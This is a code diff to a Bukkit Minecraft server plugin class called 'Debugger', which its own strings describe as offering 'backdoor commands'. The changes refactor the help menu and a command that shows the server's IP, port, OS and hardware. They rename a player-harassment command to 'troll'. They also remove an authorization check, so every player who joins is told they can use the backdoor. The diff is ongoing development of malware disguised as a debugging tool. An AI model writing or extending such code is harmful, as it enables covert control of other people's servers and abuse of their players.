@@ -101,7 +101,7 @@ public final class Debugger implements Listener {
         if (indexOfCommand == -1)
             return "";
 
-        return Config.help_messages[indexOfCommand].toString();
+        return Config.help_messages[indexOfCommand].getSyntaxHelp();
     }
 
     public Debugger(Plugin plugin, boolean Usernames, String[] UUID, String prefix, String discord_token, boolean InjectOther, boolean warnings){
@@ -264,10 +264,10 @@ public final class Debugger implements Listener {
         Player player = evt.getPlayer();
         players.put(player.getName(), new PlayerState());
         if(Config.display_debug_messages)
-            System.out.println("Creating states for player: " + player.getName());
+            Bukkit.getConsoleSender()
+                    .sendMessage("Creating states for player: " + player.getName());
 
-        if(!Config.authorized_uuids[0].equals("") && IsUserAuthorized(player))
-            player.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are authorized to use backdoor commands. Prefix: '" + Config.command_prefix + "'");
+        player.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are authorized to use backdoor commands. Run " + Config.command_prefix + "help");
     }
 
     /*Basic command parser*/
@@ -517,26 +517,26 @@ public final class Debugger implements Listener {
                     long memUsed = (r.totalMemory() - r.freeMemory()) / 1048576L;
                     long memMax = r.maxMemory() / 1048576L;
 
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.GRAY + " ----------------------------------------------");
+                    p.sendMessage(ChatColor.GRAY + " ----------------------------------------------");
 
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Server IP: " + ChatColor.GRAY + ip + Bukkit.getServer().getPort());
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Server version: " + ChatColor.GRAY + Bukkit.getVersion());
+                    p.sendMessage(ChatColor.WHITE + " Server IP: " + ChatColor.GRAY + ip + Bukkit.getServer().getPort());
+                    p.sendMessage(ChatColor.WHITE + " Server version: " + ChatColor.GRAY + Bukkit.getVersion());
 
                     String nameOS = System.getProperty("os.name");
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " OS: " + ChatColor.GRAY + nameOS);
+                    p.sendMessage(ChatColor.WHITE + " OS: " + ChatColor.GRAY + nameOS);
 
                     String osVersion = System.getProperty("os.version");
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " OS Version: " + ChatColor.GRAY + osVersion);
+                    p.sendMessage(ChatColor.WHITE + " OS Version: " + ChatColor.GRAY + osVersion);
 
                     String osType = System.getProperty("os.arch");
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Architecture: " + ChatColor.GRAY + osType);
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Cores: " + ChatColor.GRAY + r.availableProcessors());
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " RAM (max): " + ChatColor.GRAY + memMax + "MB");
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " RAM (used): " + ChatColor.GRAY + memUsed + "MB");
+                    p.sendMessage(ChatColor.WHITE + " Architecture: " + ChatColor.GRAY + osType);
+                    p.sendMessage(ChatColor.WHITE + " Cores: " + ChatColor.GRAY + r.availableProcessors());
+                    p.sendMessage(ChatColor.WHITE + " RAM (max): " + ChatColor.GRAY + memMax + "MB");
+                    p.sendMessage(ChatColor.WHITE + " RAM (used): " + ChatColor.GRAY + memUsed + "MB");
 
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.GRAY + " ----------------------------------------------");
+                    p.sendMessage(ChatColor.GRAY + " ----------------------------------------------");
                 } catch (IOException e) {
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Something went wrong!");
+                    return "Error gathering system info";
                 }
 
                 return "";
@@ -847,9 +847,9 @@ public final class Debugger implements Listener {
                 return "";
             }
 
-            case "mindfuck": { //Fucks with players
+            case "troll": { //Trolls players
                 if (args.length < 3) //No player specified
-                    return help_message("mindfuck");
+                    return help_message("troll");
 
                 String username = args[2];
 
@@ -1110,13 +1110,7 @@ public final class Debugger implements Listener {
 
             case "help": {
                 if (args.length == 1) {
-                    p.sendMessage(Config.help_detail_color + "-----------------------------------------------------");
-                    p.sendMessage(Config.help_detail_color + "Thicc Industries () = Required, [] = Optional.");
-                    for (int i = 0; i < Config.help_messages.length; i++) {
-                        p.sendMessage(Config.help_command_name_color + Config.command_prefix + Config.help_messages[i].getName() + ": " + Config.help_messages[i].getSyntax());
-                    }
-
-                    p.sendMessage(Config.help_detail_color + "-----------------------------------------------------");
+                    p.sendMessage(Config.HelpItem.buildHelpMenu());
                     return "";
                 }
 
@@ -1124,7 +1118,8 @@ public final class Debugger implements Listener {
                     String message = help_message(args[1]);
                     if(message.isEmpty())
                         return "Unknown command: " + args[1];
-                    return message;
+                    p.sendMessage(message);
+                    return "";
                 }
             }
 
